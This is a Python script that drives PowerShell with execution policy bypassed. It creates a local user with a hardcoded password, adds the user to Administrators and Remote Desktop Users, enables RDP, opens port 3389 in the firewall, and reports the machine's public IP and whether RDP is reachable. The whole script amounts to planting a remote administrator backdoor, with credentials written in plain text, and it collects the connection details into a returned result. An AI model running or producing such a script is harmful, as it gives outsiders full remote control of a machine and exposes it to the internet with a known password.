import subprocess
import os
import urllib.request
import socket

# Надёжный путь к системному PowerShell
POWERSHELL = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

if not os.path.exists(POWERSHELL):
    POWERSHELL = r"C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe"

output = []


def run_ps(script):

    cmd = [
        POWERSHELL,
        "-NoProfile",
        "-ExecutionPolicy", "Bypass",
        "-Command",
        script
    ]

    print("\n[DEBUG] Running PowerShell:\n", script)
    output.append(["\n[DEBUG] Running PowerShell:\n", script])

    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
    except Exception as e:
        print("[EXCEPTION]", e)
        output.append(["[EXCEPTION]", e])
        return False

    print("[STDOUT]")
    output.append(["[STDOUT]"])
    print(result.stdout)
    output.append([result.stdout])

    print("[STDERR]")
    output.append(["[STDERR]"])
    print(result.stderr)
    output.append([result.stderr])

    print("[DEBUG] Return code:", result.returncode)
    output.append(["[DEBUG] Return code:", result.returncode])

    return result.returncode == 0


def get_public_ip():
    urls = [
        "https://api.ipify.org",
        "https://ifconfig.me/ip",
        "https://checkip.amazonaws.com"
    ]

    for url in urls:
        try:
            ip = urllib.request.urlopen(url, timeout=5).read().decode().strip()
            if ip:
                return ip
        except:
            pass

    return "unknown"


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "unknown"


def check_rdp(host):
    s = socket.socket()
    s.settimeout(3)

    try:
        s.connect((host, 3389))
        s.close()
        return True
    except:
        return False


username = "remoteuser1"
password = "StrongPassword1234!"

print("[INFO] Starting setup...")
output.append(["[INFO] Starting setup..."])


check_admin = """
$current = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $current.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
    Write-Error "Script must run as Administrator"
    exit 1
}
exit 0
"""


create_user = f"""
$user = Get-LocalUser -Name "{username}" -ErrorAction SilentlyContinue

if ($null -eq $user) {{
    $password = ConvertTo-SecureString "{password}" -AsPlainText -Force
    New-LocalUser -Name "{username}" -Password $password -FullName "Remote User" -Description "RDP Admin User"
    Write-Output "User created"
}} else {{
    Write-Output "User already exists"
}}

Add-LocalGroupMember -Group "Remote Desktop Users" -Member "{username}" -ErrorAction SilentlyContinue
Add-LocalGroupMember -SID S-1-5-32-544 -Member "{username}" -ErrorAction SilentlyContinue

Write-Output "User added to Administrators and Remote Desktop Users"

exit 0
"""


enable_rdp = r"""
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0

Set-Service -Name TermService -StartupType Automatic
Start-Service TermService -ErrorAction SilentlyContinue

Write-Output "RDP enabled"

exit 0
"""


firewall = r"""
Enable-NetFirewallRule -Name "RemoteDesktop-UserMode-In-TCP" -ErrorAction SilentlyContinue
Enable-NetFirewallRule -Name "RemoteDesktop-UserMode-In-UDP" -ErrorAction SilentlyContinue

netsh advfirewall firewall add rule name="RDP 3389" dir=in action=allow protocol=TCP localport=3389

Write-Output "Firewall rule added"

exit 0
"""


if not run_ps(check_admin):
    print("[STOP] Administrator privileges required")
    output.append(["[STOP] Administrator privileges required"])

elif not run_ps(create_user):
    print("[STOP] Failed creating user")
    output.append(["[STOP] Failed creating user"])

elif not run_ps(enable_rdp):
    print("[STOP] Failed enabling RDP")
    output.append(["[STOP] Failed enabling RDP"])

elif not run_ps(firewall):
    print("[STOP] Failed configuring firewall")
    output.append(["[STOP] Failed configuring firewall"])

else:
    print("\n[SUCCESS] Setup completed")
    output.append(["\n[SUCCESS] Setup completed"])
    print(f"[INFO] RDP admin user: {username}")
    output.append([f"[INFO] RDP admin user: {username}"])

    local_ip = get_local_ip()
    public_ip = get_public_ip()

    print("\n[NETWORK INFO]")
    output.append(["\n[NETWORK INFO]"])
    print(f"Local IP: {local_ip}")
    output.append([f"Local IP: {local_ip}"])
    print(f"Public IP: {public_ip}")
    output.append([f"Public IP: {public_ip}"])

    print("\n[RDP ADDRESSES]")
    output.append(["\n[RDP ADDRESSES]"])
    print(f"Local RDP: {local_ip}:3389")
    output.append([f"Local RDP: {local_ip}:3389"])
    print(f"Public RDP: {public_ip}:3389")
    output.append([f"Public RDP: {public_ip}:3389"])

    local_rdp = check_rdp(local_ip)
    public_rdp = check_rdp(public_ip)

    print("\n[RDP STATUS]")
    output.append(["\n[RDP STATUS]"])
    print(f"Local RDP reachable: {local_rdp}")
    output.append([f"Local RDP reachable: {local_rdp}"])
    print(f"Public RDP reachable: {public_rdp}")
    output.append([f"Public RDP reachable: {public_rdp}"])

result = output
